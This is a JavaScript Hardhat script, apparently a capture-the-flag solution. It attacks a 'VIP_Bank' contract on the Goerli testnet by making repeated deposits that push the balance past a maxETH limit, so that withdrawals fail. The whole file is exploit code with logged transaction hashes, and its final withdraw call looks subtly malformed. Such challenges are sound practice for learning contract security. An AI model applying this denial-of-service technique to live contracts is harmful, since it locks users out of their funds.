require("dotenv").config();
const { ethers } = require("hardhat");
const hre = require("hardhat");

async function main() {
  const contractAddress = "0xB6dDAf3348914D6E317bC3BC40AdC299A7F9b6b8";
  const provider = new ethers.providers.JsonRpcProvider(process.env.GOERLI_URL);
  const wallet = new ethers.Wallet(process.env.PRIVATE_KEY, provider);
  const Vip = await hre.ethers.getContractAt(
    "VIP_Bank",
    contractAddress,
    wallet
  );
  const deposit1 = await Vip.deposit({
    value: ethers.utils.parseEther("0.05"),
  });
  console.log(deposit1.hash);
  // 0xf7d69d23d361955ccd23074bc4645fd4e5604dddd98c70920caadcd30eab0eca

  const deposit2 = await Vip.deposit({
    value: ethers.utils.parseEther("0.05"),
  });
  console.log(deposit2.hash);
  //0xbcba2343def013fcbfd2c41db014e32555675dd033d2cab717d05e4067083524

  const deposit3 = await Vip.deposit({
    value: ethers.utils.parseEther("0.05"),
  });
  console.log(deposit3.hash);
  // 0xcac16e05c10b26566214fa74346933e9ce35e6c1f5998fe100b831fe88ad0a29

  const deposit4 = await Vip.deposit({
    value: ethers.utils.parseEther("0.05"),
  });
  console.log(deposit4.hash);
  // 0xea1fb69d28cda50422678a2cfce9de1263460cd50cee9843fa9b83fc2843f7d6

  const deposit5 = await Vip.deposit({
    value: ethers.utils.parseEther("0.05"),
  });
  console.log(deposit5.hash);
  // 0x6f9058b0fcfeffc56e8865eca5d5717c25377eb72d2de840aba0da0310544ce6

  const deposit6 = await Vip.deposit({
    value: ethers.utils.parseEther("0.05"),
  });
  console.log(deposit6.hash);
  // 0xa14fdf759f215e4ca3e838d833a7688187286e79406e11131e353e7cceb22a59

  const deposit7 = await Vip.deposit({
    value: ethers.utils.parseEther("0.05"),
  });
  console.log(deposit7.hash);
  // 0xff7327c36318fbc85ac9f01da605362aa0ac083fb73959edddcb7ba786483edd

  const deposit8 = await Vip.deposit({
    value: ethers.utils.parseEther("0.05"),
  });
  console.log(deposit8.hash);
  // 0x78bb53d5c6eec4514b55bb0ed447b17e6604c495a60b5006108f04a5e2acb915

  const deposit9 = await Vip.deposit({
    value: ethers.utils.parseEther("0.05"),
  });
  console.log(deposit9.hash);
  // 0x9d11b9daf93c82904bfe40d8ddb1a07ce9ece4f0c4605eef9f17a9501a31dac1

  const deposit10 = await Vip.deposit({
    value: ethers.utils.parseEther("0.05"),
  });
  console.log(deposit10.hash);
  // 0xaa80c39266349f55697d59d9789050db51d5bae44cec00c02eedebb48728863e

  const deposit11 = await Vip.deposit({
    value: ethers.utils.parseEther("0.05"),
  });
  console.log(deposit11.hash);
  // 0x64095067d8fe5ea3779a2d0bddd83e870f2204209a69824292e7f9f1fbb9177f

  const contractBalance = await Vip.contractBalance();
  console.log(contractBalance, "ETH");
  // BigNumber { value: "700000000000000000" } ETH

  const withdraw = await Vip.withdraw(0.05);
  console.log(withdraw.hash);
  // this will underflow and fail because the contract balance
  // is greater than maxETH, thus VIP would never be able to withdraw
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
